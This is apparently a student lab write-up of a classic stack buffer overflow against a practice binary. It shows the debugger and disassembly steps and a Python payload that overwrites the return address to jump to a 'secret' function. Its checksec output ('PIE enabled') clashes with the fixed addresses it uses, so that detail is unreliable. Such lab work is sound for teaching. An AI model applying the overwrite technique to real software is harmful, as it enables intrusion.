# Task 1: Stack Smashing Exploit Documentation

## Memory Analysis

### Buffer Starting Address
- **Address**: `0xffffcb18` (found via `ebp - 0x10` in GDB)
- **Verification Command**:
  ```bash
  (gdb) print $ebp - 0x10



## Exploit Analysis

### 1. Buffer Starting Address
- **Address:** `0xffffcb18`
- **Found Using:** 
  ```gdb
  (gdb) print $ebp - 0x10
  $1 = (void *) 0xffffcb18
  ```

### 2. Buffer Offset from Frame Pointer
- **Offset:** 16 bytes (0x10)
- **Calculation:** 
  ```
  EBP Address (0xffffcb28) - Buffer Start (0xffffcb18) = 16 bytes
  ```

### 3. Return Address of Secret Function
- **Address:** `0x08049196`
- **Verification:**
  ```bash
  $ objdump -d vuln | grep secret -A1
  08049196 <secret>:
   8049196:       55                      push   %ebp
  ```

### 4. First Assembly Instruction
- **At Address:** `0x08049196`
- **Instruction:** `push %ebp` (function prologue)
- **Full Disassembly:**
  ```asm
  08049196 <secret>:
    8049196:       55                      push   %ebp
    8049197:       89 e5                   mov    %esp,%ebp
    8049199:       53                      push   %ebx
    ...
  ```


## Exploit Details
### Payload Structure
```python
payload = (
    b'A' * 16 +           # Fill buffer and alignment space
    b'B' * 4 +            # Overwrite saved EBP
    p32(0x08049196) +      # Return address (secret())
    b'\n'                 # Terminate gets() input
)
```

### Key Observations
1. Required precise 20-byte padding to reach return address
2. Used infinite loop in `secret()` to prevent post-execution crashes
3. Confirmed ASLR was disabled:
   ```bash
   $ cat /proc/sys/kernel/randomize_va_space
   0
   ```

## Verification Commands
```bash
# Check binary protections
$ checksec vuln
[*] '/path/to/vuln'
    Arch:     i386-32-little
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled

# Test exploit
$ python3 exp-practice.py | ./vuln
> AAAAAAAAAAAAAAAABBBBï¿½
>> you have found the secret function
```
